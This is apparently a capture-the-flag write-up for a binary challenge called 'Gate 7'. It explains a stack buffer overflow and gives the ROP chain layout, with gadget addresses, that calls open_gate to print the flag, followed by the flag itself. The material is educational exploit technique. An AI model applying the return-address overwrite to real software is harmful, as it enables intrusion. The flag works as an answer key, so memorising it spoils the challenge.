# Gate 7

`nc gate7.wolvctf-2026.kctf.cloud 1337`

## Bug

`read_full(0, rbp-0x30, 0x80)` reads 128 bytes into a 48-byte buffer. The extra bytes overwrite the saved return address at offset `0x38`.

## Exploit

Send 0x30 filler bytes, 8 bytes for saved RBP, then a ROP chain. `pop rdi; ret` sets `rdi = 0xc0ffee`. One `ret` fixes stack alignment. `open_gate` then opens `/flag` and prints it. Pad the input to 128 bytes because `read_full` reads the full length.

```text
'A' * 0x30
'B' * 8
0x401206   pop rdi; ret
0xc0ffee
0x401207   ret
0x40120b   open_gate
padding to 0x80
```

## Flag

`wctf{p0p_rd1_ret_th3_gate_1s_0p3n}`
